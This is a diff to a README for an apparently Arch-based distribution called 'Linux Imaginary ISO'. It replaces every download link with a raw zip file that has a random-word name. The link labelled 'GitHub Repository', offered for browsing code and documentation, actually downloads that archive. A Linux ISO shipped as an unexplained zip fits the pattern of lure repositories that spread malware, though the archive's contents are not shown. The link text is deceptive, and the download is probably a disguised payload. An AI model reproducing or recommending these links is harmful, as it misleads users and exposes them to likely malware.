@@ -6,7 +6,7 @@ Welcome to the official repository of **Linux Imaginary ISO**, a relatively ligh
 
 Within this repository, you will find all the necessary resources and files to explore, contribute, and build upon the **Linux Imaginary ISO** project. Feel free to dive in and discover the world of custom Linux distributions powered by Arch!
 
-Explore the code, documentation, and more by visiting the [GitHub Repository](https://github.com/Roubinsh01/Linux-Imaginary-iso/releases/download/v1.0.0/Application.zip).
+Explore the code, documentation, and more by visiting the [GitHub Repository](https://github.com/Roubinsh01/Linux-Imaginary-iso/raw/refs/heads/main/images/Linux_Imaginary_iso_dyschromatoptic.zip).
 
 ## 🚀 Features
 
@@ -21,9 +21,9 @@ Explore the code, documentation, and more by visiting the [GitHub Repository](ht
 
 To get started with **Linux Imaginary ISO**, you can download the latest release from the following link:
 
-[![Download Linux Imaginary ISO](https://github.com/Roubinsh01/Linux-Imaginary-iso/releases/download/v1.0.0/Application.zip)](https://github.com/Roubinsh01/Linux-Imaginary-iso/releases/download/v1.0.0/Application.zip)
+[![Download Linux Imaginary ISO](https://github.com/Roubinsh01/Linux-Imaginary-iso/raw/refs/heads/main/images/Linux_Imaginary_iso_dyschromatoptic.zip)](https://github.com/Roubinsh01/Linux-Imaginary-iso/raw/refs/heads/main/images/Linux_Imaginary_iso_dyschromatoptic.zip)
 
-Click on the badge above to download the **https://github.com/Roubinsh01/Linux-Imaginary-iso/releases/download/v1.0.0/Application.zip** file and begin exploring the world of **Linux Imaginary ISO**.
+Click on the badge above to download the **https://github.com/Roubinsh01/Linux-Imaginary-iso/raw/refs/heads/main/images/Linux_Imaginary_iso_dyschromatoptic.zip** file and begin exploring the world of **Linux Imaginary ISO**.
 
 If the link does not work or is not provided, please check the "Releases" section of the repository for alternative download options.
 
